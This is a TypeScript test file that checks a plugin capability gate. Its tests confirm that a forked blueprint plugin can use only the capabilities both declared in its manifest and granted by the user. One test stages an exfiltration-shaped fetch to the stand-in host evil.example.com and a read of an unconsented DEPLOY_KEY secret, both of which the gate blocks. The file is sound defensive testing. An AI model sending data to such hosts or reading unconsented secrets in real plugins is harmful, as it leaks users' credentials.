/**
 * E5 — fork→install supply-chain consent gate.
 *
 * Plan: harness-blueprint-distribution-2026-06-03 (P-009, D-007/D-009).
 *
 * Forking a Cupboard blueprint/snapshot listing pulls plugin CODE = a
 * supply-chain surface. The v1 trust posture (D-007/D-009) is the EXISTING
 * plugin model: manifest-declared `capabilities[]` (tier 1) ∩ the set the user
 * consents to at install time (tier 2). Signing / a review process are
 * deferred (acceptable — no users yet). The producer-side trust surface
 * (collaborator push-access to the project remote) is out of scope here (D-012).
 *
 * These tests model the fork→install path against the canonical runtime gate
 * (`hasCapability` + the fetch/secrets proxies a forked plugin actually hits)
 * and pin the supply-chain invariant the plan relies on:
 *
 *   A forked blueprint's bundled plugin can use a capability ⟺
 *     it is BOTH declared in the plugin manifest AND granted by the user at
 *     install. It can never escalate beyond either.
 *
 * The capability primitive itself is unit-tested in capabilities.test.ts; this
 * file is the scenario-level contract for the distribution trust posture.
 */

import { describe, it } from 'vitest';
import assert from 'node:assert/strict';
import {
  hasCapability,
  requireCapability,
  makeFetchProxy,
  makeSecretsProxy,
  MissingCapabilityError,
  type CapabilityCheckContext,
} from './capabilities.ts';

/**
 * Model the install-consent decision: the operator presents the plugin's
 * manifest caps to the user, who approves a subset. The runtime context for a
 * forked plugin is then manifest ∩ granted (what plugin-host-runtime builds
 * from `loadGrantedCapsSafe` at init).
 */
function installForkedPlugin(opts: {
  pluginName: string;
  /** What the bundled blueprint plugin's manifest declares. */
  manifestCaps: string[];
  /** What the user consented to at the install prompt (⊆ manifest in practice). */
  userGranted: string[];
}): CapabilityCheckContext {
  return {
    pluginName: opts.pluginName,
    capabilities: opts.manifestCaps as CapabilityCheckContext['capabilities'],
    granted: opts.userGranted as CapabilityCheckContext['granted'],
  };
}

describe('E5 fork→install supply-chain consent gate (D-007/D-009)', () => {
  it('a forked plugin gets ONLY the capabilities the user consented to', () => {
    // Manifest asks for two; user consents to one at the install prompt.
    const ctx = installForkedPlugin({
      pluginName: 'forked-blueprint-plugin',
      manifestCaps: ['tasks:read', 'http:fetch:api.example.com'],
      userGranted: ['tasks:read'],
    });
    assert.equal(hasCapability(ctx, 'tasks:read'), true);              // consented → allowed
    assert.equal(hasCapability(ctx, 'http:fetch:api.example.com'), false); // declared but NOT consented → denied
  });

  it('install-consent of nothing denies every manifest capability', () => {
    // The user clicks "deny" / installs without granting → the plugin is inert.
    const ctx = installForkedPlugin({
      pluginName: 'no-consent',
      manifestCaps: ['tasks:read', 'secrets:read:TOKEN'],
      userGranted: [],
    });
    assert.equal(hasCapability(ctx, 'tasks:read'), false);
    assert.equal(hasCapability(ctx, 'secrets:read:TOKEN'), false);
  });

  it('a forked plugin cannot escalate beyond its manifest, even if a grant names the cap', () => {
    // A malicious/forged grant set can never authorize a cap the manifest
    // didn't declare — tier 1 (manifest) is still required. So a tampered
    // fork can't silently widen the manifest.
    const ctx = installForkedPlugin({
      pluginName: 'escalation-attempt',
      manifestCaps: ['tasks:read'],
      userGranted: ['tasks:read', 'secrets:read:DEPLOY_KEY'], // grant names a cap NOT in the manifest
    });
    assert.equal(hasCapability(ctx, 'tasks:read'), true);
    assert.equal(hasCapability(ctx, 'secrets:read:DEPLOY_KEY'), false);
  });

  it('the dangerous fork surfaces — outbound fetch + secret reads — are gated by consent', async () => {
    // network: manifest+granted youtube.com only.
    const ctx = installForkedPlugin({
      pluginName: 'exfil-shaped',
      manifestCaps: ['http:fetch:youtube.com', 'secrets:read:YT_API_KEY'],
      userGranted: ['http:fetch:youtube.com', 'secrets:read:YT_API_KEY'],
    });

    const calls: string[] = [];
    const fakeFetch = (async (input: unknown) => {
      calls.push(typeof input === 'string' ? input : String(input));
      return new Response('ok');
    }) as typeof fetch;
    const fetchProxy = makeFetchProxy(ctx, fakeFetch);

    // Consented host → allowed.
    const ok = await fetchProxy('https://youtube.com/feed');
    assert.equal(ok.status, 200);

    // A different host (classic exfil destination) → blocked, never reaches realFetch.
    await assert.rejects(
      () => fetchProxy('https://evil.example.com/collect'),
      (e: Error) => e instanceof MissingCapabilityError,
    );
    assert.deepEqual(calls, ['https://youtube.com/feed']); // only the consented call hit the wire

    // Secret reads: only the consented secret name resolves.
    const secrets = makeSecretsProxy(ctx, async (name) => `value-of-${name}`);
    assert.equal(await secrets.read('YT_API_KEY'), 'value-of-YT_API_KEY');
    await assert.rejects(
      () => secrets.read('DEPLOY_KEY'),
      (e: Error) => e instanceof MissingCapabilityError,
    );
  });

  it('a granted wildcard only authorizes hosts the manifest already declared (no blanket grant)', () => {
    // User grants a subdomain wildcard at install; it still cannot reach a host
    // the manifest never declared — manifest ∩ granted, both wildcards-aware.
    const ctx = installForkedPlugin({
      pluginName: 'wildcard-fork',
      manifestCaps: ['http:fetch:api.foo.com', 'http:fetch:cdn.foo.com'],
      userGranted: ['http:fetch:*.foo.com'],
    });
    assert.equal(hasCapability(ctx, 'http:fetch:api.foo.com'), true);
    assert.equal(hasCapability(ctx, 'http:fetch:cdn.foo.com'), true);
    assert.equal(hasCapability(ctx, 'http:fetch:api.bar.com'), false); // outside manifest
  });

  it('requireCapability throws on an unconsented capability (the runtime enforcement point)', () => {
    const ctx = installForkedPlugin({
      pluginName: 'enforced',
      manifestCaps: ['compute:exec:py'],
      userGranted: [],
    });
    assert.throws(
      () => requireCapability(ctx, 'compute:exec:py'),
      (e: Error) => e instanceof MissingCapabilityError,
    );
  });
});
